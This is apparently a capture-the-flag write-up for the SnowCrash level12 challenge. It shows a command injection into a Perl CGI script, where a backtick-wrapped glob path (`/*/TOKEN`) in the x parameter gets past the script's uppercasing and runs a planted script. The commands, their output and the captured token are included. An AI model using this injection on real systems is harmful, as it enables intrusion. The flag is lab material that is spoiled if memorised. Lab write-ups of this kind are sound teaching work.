### Exploit

Yet another Perl script with unprotected parameters. Do they ever learn? Yet this time around, we can't simply call getflag through parameter __x__, as the str argument "getflag" is to be transformed in to "GETFLAG" because of this line:
> $xx =~ tr/a-z/A-Z/;



```
    level12@SnowCrash:~$ cat /tmp/TOKEN
    #!/bin/sh
    getflag > /tmp/key
    level12@SnowCrash:~$ ./level12.pl "?x="`/*/TOKEN`""
    /tmp/TOKEN: 2: /tmp/TOKEN: cannot create /tmp/key: Permission denied
    Content-type: text/html

    ..level12@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The proof is in the pudding...
